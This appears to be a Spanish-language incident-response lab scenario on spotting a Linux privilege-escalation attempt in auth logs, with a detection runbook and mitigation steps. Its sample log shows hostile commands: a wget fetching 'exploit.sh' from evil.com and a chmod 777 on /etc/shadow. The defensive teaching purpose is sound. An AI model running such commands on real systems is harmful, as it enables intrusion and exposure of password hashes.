# 🧩 Escenario: Detectar intento de escalación de privilegios

**Dominio:** security
**Nivel:** 🔴 Avanzado
**Herramientas:** `find`, `grep`, `awk`, `last`, `stat`, `ausearch`
**Archivos:** `labs/docker-compose.security.yml`

---

## 🎯 Problema

Revisando los logs del sistema, encontrás entradas sospechosas en `/var/log/auth.log`: intentos de `su`, `sudo` fallidos desde un usuario sin privilegios, y comandos inusuales como `wget` descargando scripts. Es necesario determinar si fue un intento de escalación de privilegios, si fue exitoso, y qué archivos o configuraciones fueron modificadas.

---

## ⚡ Quick command (SRE)

```bash
grep -E "Failed password|authentication failure|sudo.*COMMAND|su:|USER=root" /var/log/auth.log | tail -30
```

---

## ✅ Salida esperada

```text
Jul 10 03:15:22 server sudo:   www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/exploit.sh
Jul 10 03:15:45 server sudo:   www-data : 3 incorrect password attempts
Jul 10 03:16:01 server su: FAILED SU (to root) www-data on pts/0
Jul 10 03:17:12 server sudo:   www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/chmod 777 /etc/shadow
```

Interpretación:

- `sudo` desde `www-data` → el usuario web intenta ejecutar comandos como root
- `wget` descargando un script → posible malware o herramienta de explotación
- `chmod 777 /etc/shadow` → intento de hacer legible el archivo de contraseñas
- `su: FAILED SU` → intento fallido de cambiar a root directamente
- 3 intentos de contraseña incorrectos → fuerza bruta local

---

## 🧠 Diagnóstico

Un intento de escalación de privilegios deja rastros en múltiples capas:

- **auth.log**: intentos de sudo/su, cambios de usuario
- **bash history**: comandos ejecutados por el atacante
- **Archivos modificados**: `/etc/shadow`, `/etc/sudoers`, binaries con SUID
- **Conexiones de red**: descargas desde IPs externas

Patrones a buscar:

- Usuario de servicio (www-data, nobody, mysql) ejecutando comandos interactivos
- `wget` o `curl` desde `/tmp` o `/dev/shm`
- `chmod` sobre archivos de sistema
- Nuevos archivos SUID (`chmod u+s`)
- Modificaciones en `/etc/sudoers`

---

## 🛠️ Procedimiento (runbook)

### 1. Revisar intentos de autenticación anómalos

```bash
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn
grep "sudo.*COMMAND" /var/log/auth.log | awk -F'COMMAND=' '{print $2}' | sort | uniq -c | sort -rn
```

### 2. Revisar comandos ejecutados por usuarios de servicio

```bash
cat /home/*/.bash_history 2>/dev/null
cat /var/www/.bash_history 2>/dev/null
```

### 3. Buscar archivos SUID sospechosos

```bash
find / -type f -perm -4000 -newer /etc/passwd 2>/dev/null
find / -type f -perm -4000 -user root -not -group root 2>/dev/null
```

### 4. Verificar modificaciones recientes en /etc/

```bash
find /etc -type f -mtime -1 -ls 2>/dev/null
stat -c "%y %n" /etc/shadow /etc/sudoers /etc/passwd
```

### 5. Verificar conexiones de red activas desde usuarios no root

```bash
ss -tunp | grep -v root
```

### 6. Bloquear al usuario comprometido

```bash
passwd -l www-data
pkill -u www-data
```

---

## 🧯 Mitigación

Verificar:

```bash
stat /etc/sudoers /etc/shadow /etc/passwd
```

Acción:

- Lockear la cuenta comprometida: `passwd -l <usuario>`
- Eliminar SUID malicioso: `chmod -s <archivo>`
- Bloquear IP externa: `iptables -A INPUT -s <IP> -j DROP`
- Restaurar `/etc/sudoers` de backup si fue modificado

Rollback:

- Restaurar configuraciones de backup
- Cambiar contraseñas de todos los usuarios
- Regenerar claves SSH si fueron comprometidas

---

## ✅ Interpretación

Un intento de escalación desde un usuario de servicio (www-data, nobody) es grave porque indica que el atacante ya tiene un foothold en el sistema. El vector más común es una vulnerabilidad web (RCE, LFI, file upload) que permite ejecutar comandos como el usuario del servidor web.

La detección temprana es crítica: si el atacante logra escalar a root, pierde el control del servidor.

---

## 🐧 Variante Alpine (OpenRC)

```bash
# En Alpine, auth.log puede estar en /var/log/messages
grep "auth\|sudo\|su:" /var/log/messages | tail -30

# Alpine no tiene ausearch por defecto
# Usar grep en logs directamente
apk add util-linux   # para last, lastlog
last | head -20
```

---

## 🔗 Referencias

- [`find`](../../guides/find.md) — búsqueda de archivos SUID y modificaciones recientes
- [`grep`](../../guides/grep.md) — filtrado de logs de autenticación
- [`stat`](../../guides/stat.md) — metadatos de archivos modificados
- [`ss`](../../guides/ip_ss.md) — conexiones de red activas
- [`iptables`](../../guides/iptables.md) — bloqueo de IPs maliciosas
- [`scenario`](01-detect-and-block-malicious-ips.md) — IPs maliciosas en logs
- [`scenario`](02-suid-audit-and-file-permissions.md) — auditoría de archivos SUID
